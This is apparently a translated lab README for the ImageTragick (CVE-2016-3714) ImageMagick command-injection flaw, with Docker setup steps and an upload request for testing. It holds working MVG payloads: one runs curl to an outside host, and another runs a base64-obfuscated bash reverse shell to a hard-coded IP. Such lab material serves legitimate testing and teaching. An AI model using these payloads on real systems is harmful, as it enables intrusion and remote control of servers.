# Imagetragick Command Execution Vulnerability (CVE-2016–3714)

See https://imagetragick.com/ and https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html for details, no longer describing the principle.

## Test Methods

POC for some tests: https://github.com/ImageTragick/PoCs

Compile and start the test environment:

```
Docker-compose build
Docker-compose up -d
```

There are three files visible at http://your-ip/`:

```bash
├── demo.php # Use the vul.jpg+identify command to test
├── upload.php # Support users to upload and upload uploaded files to PHP's imagick extension to trigger the vulnerability
└── vul.jpg # A simple POC
```

First visit `http://your-ip/demo.php`, the command is not echoed, but in the docker container, the `/tmp/success` file has been successfully obtained:

![](1.png)

Then visit the `http://your-ip/demo.php` test and upload the POC file. The data package is as follows (**Note, I changed a POC**):

```
POST /upload.php HTTP/1.1
Host: your-ip
Content-Length: 321
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydGYwkOC91nnON1ws
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN, zh; q=0.8, en; q=0.6
Connection: close

------WebKitFormBoundarydGYwkOC91nnON1ws
Content-Disposition: form-data; name="file_upload"; filename="vul.gif"
Content-Type: image/jpeg

Push graphic-context
Viewbox 0 0 640 480
Fill 'url(https://127.0.0.0/oops.jpg"|curl "www.leavesongs.com:8889)'
Pop graphic-context
------WebKitFormBoundarydGYwkOC91nnON1ws--

```

It can be seen that `www.leavesongs.com:8889` has received the http request, indicating that the curl command is executed successfully:

![](2.png)

Rebound shell POC:

```
Push graphic-context
Viewbox 0 0 640 480
Fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d | bash`"||id " )'
Pop graphic-context
```

![](3.png)